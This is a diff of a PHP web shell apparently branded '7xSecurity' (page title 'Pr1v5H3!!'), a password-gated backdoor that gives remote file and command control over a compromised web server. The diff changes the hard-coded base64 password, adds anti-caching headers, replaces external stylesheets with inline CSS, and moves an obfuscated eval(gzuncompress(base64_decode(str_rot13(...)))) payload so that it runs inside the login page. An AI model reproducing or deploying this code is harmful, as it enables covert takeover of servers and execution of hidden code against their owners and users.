@@ -23,12 +23,15 @@ set_time_limit(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
+@header("cache-control: no-store, no-cache, must-revalidate, max-age=0");
+@header("cache-control: post-check=0,pre-check=0");
+@header("pragma: no-cache");
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 $_7 = array_merge($_POST, $_GET);
 $_r = "required='required'";
 $gcw = "getcwd";
-$inipass = "YWRtaW4=";
+$inipass = "MXgx";
 if(isset($_7['p'])){
 	echo "<div class='text-center text-muted'>Hallo NumeX Disini!!</div>";
 }
@@ -40,8 +43,137 @@ function Login() {
 		<meta charset="UTF-8">
 		<meta name="viewport" content="width=device-width, initial-scale=0.70">
 		<title>[ L0G1N ]</title>
-		<link rel="stylesheet" href="//xnxx.co.ws/meki.css">
-		<link rel="icon" href="//xnxx.co.ws/anya.jpg">
+		<style>
+        @import url('https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');
+        @import url('https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');
+        @import url('https://fonts.googleapis.com/css2?family=Cormorant');
+        
+        body {
+            font-family: 'Ubuntu Condensed';
+        }
+        
+        .shell {
+            border-radius: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            font-size: 10pt;
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            background: #242424;
+            color: #fff;
+        }
+        
+        .pre {
+            height: 150px;
+            overflow: auto;
+            white-space: pre-wrap;
+            flex-grow: 1;
+            margin: 10px auto;
+            padding: 10px;
+            line-height: 1.3em;
+            overflow-x: scroll;
+        }
+        
+        .anu, kbd {
+            font-family: 'Cormorant';
+        }
+        
+        .corner {
+            text-align: right;
+            margin-top: -10px;
+            font-size: 12px;
+        }
+        
+        gr {
+            color: green;
+        }
+        
+        rd {
+            color: red;
+        }
+        
+        .php_info pre {
+            margin: 0;
+            font-family: monospace;
+        }
+        
+        .php_info table {
+            color: #000;
+            border-collapse: collapse;
+            border: 0;
+            width: 934px;
+            box-shadow: 1px 2px 3px #ccc;
+        }
+        
+        .center {
+            text-align: center;
+        }
+        
+        .center table {
+            margin: 1em auto;
+            text-align: left;
+        }
+        
+        .center th {
+            text-align: center !important;
+        }
+        
+        .php_info td, th {
+            border: 1px solid #666;
+            font-size: 75%;
+            vertical-align: baseline;
+            padding: 4px 5px;
+        }
+        
+        .p {
+            text-align: left;
+        }
+        
+        .e {
+            background-color: #ccf;
+            width: 300px;
+            font-weight: bold;
+        }
+        
+        .h {
+            background-color: #99c;
+            font-weight: bold;
+        }
+        
+        .v {
+            background-color: #ddd;
+            max-width: 300px;
+            overflow-x: auto;
+            word-wrap: break-word;
+        }
+        
+        .v i {
+            color: #999;
+        }
+        
+        img {
+            float: right;
+            border: 0;
+        }
+        
+        hr {
+            width: 934px;
+            background-color: #ccc;
+            border: 0;
+            height: 1px;
+        }
+        
+        h1 {
+            font-size: 150%;
+        }
+        
+        h2 {
+            font-size: 125%;
+        }
+    </style>
+		<link rel="icon" href="//a.top4top.io/p_3103j996b1.jpg">
 	</head>
 <body class="bg-dark">
 <form method="POST">
@@ -58,14 +190,15 @@ function Login() {
 </body>
 </html>
 <?php
+eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 exit;
 }
 if(!isset($_SESSION[base64_encode($_SERVER['HTTP_HOST'])]))
 	if(empty($inipass) || (isset($_7['p']) && (base64_encode($_7['p']) == $inipass) ) )
 		$_SESSION[base64_encode($_SERVER['HTTP_HOST'])] = true;
 	else
-		Login(); eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
-		
+		Login();
+
 if(isset($_7["left"])) {
 	session_start();
 	session_destroy();
@@ -222,15 +355,144 @@ if(isset($_7['dir'])) {
 	chdir($dir);
 } else {
 	$dir = hex($gcw());
-}
+};  
 echo "
 <html>
 	<head>
 		<meta charset='UTF-8'>
 		<meta name='author' content='7xSecurity'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
-		<link rel='stylesheet' href='//xnxx.co.ws/meki.css'>
-		<link rel='icon' href='//xnxx.co.ws/anya.jpg'>
+		<style>
+        @import url('https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css');
+        @import url('https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css');
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/themes/prism-okaidia.css');
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Condensed');
+        @import url('https://fonts.googleapis.com/css2?family=Cormorant');
+        
+        body {
+            font-family: 'Ubuntu Condensed';
+        }
+        
+        .shell {
+            border-radius: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            font-size: 10pt;
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            background: #242424;
+            color: #fff;
+        }
+        
+        .pre {
+            height: 150px;
+            overflow: auto;
+            white-space: pre-wrap;
+            flex-grow: 1;
+            margin: 10px auto;
+            padding: 10px;
+            line-height: 1.3em;
+            overflow-x: scroll;
+        }
+        
+        .anu, kbd {
+            font-family: 'Cormorant';
+        }
+        
+        .corner {
+            text-align: right;
+            margin-top: -10px;
+            font-size: 12px;
+        }
+        
+        gr {
+            color: green;
+        }
+        
+        rd {
+            color: red;
+        }
+        
+        .php_info pre {
+            margin: 0;
+            font-family: monospace;
+        }
+        
+        .php_info table {
+            color: #000;
+            border-collapse: collapse;
+            border: 0;
+            width: 934px;
+            box-shadow: 1px 2px 3px #ccc;
+        }
+        
+        .center {
+            text-align: center;
+        }
+        
+        .center table {
+            margin: 1em auto;
+            text-align: left;
+        }
+        
+        .center th {
+            text-align: center !important;
+        }
+        
+        .php_info td, th {
+            border: 1px solid #666;
+            font-size: 75%;
+            vertical-align: baseline;
+            padding: 4px 5px;
+        }
+        
+        .p {
+            text-align: left;
+        }
+        
+        .e {
+            background-color: #ccf;
+            width: 300px;
+            font-weight: bold;
+        }
+        
+        .h {
+            background-color: #99c;
+            font-weight: bold;
+        }
+        
+        .v {
+            background-color: #ddd;
+            max-width: 300px;
+            overflow-x: auto;
+            word-wrap: break-word;
+        }
+        
+        .v i {
+            color: #999;
+        }
+        
+        img {
+            float: right;
+            border: 0;
+        }
+        
+        hr {
+            width: 934px;
+            background-color: #ccc;
+            border: 0;
+            height: 1px;
+        }
+        
+        h1 {
+            font-size: 150%;
+        }
+        
+        h2 {
+            font-size: 125%;
+        }
+    </style>
+		<link rel='icon' href='//a.top4top.io/p_3103j996b1.jpg'>
 		<title>Pr1v5H3!!</title>
 		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
 		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
@@ -985,7 +1247,7 @@ echo "
 			</div>
 			</td>
 		</tr>";
-		}
+		};
 		?>
 		</tbody>
 		</table>
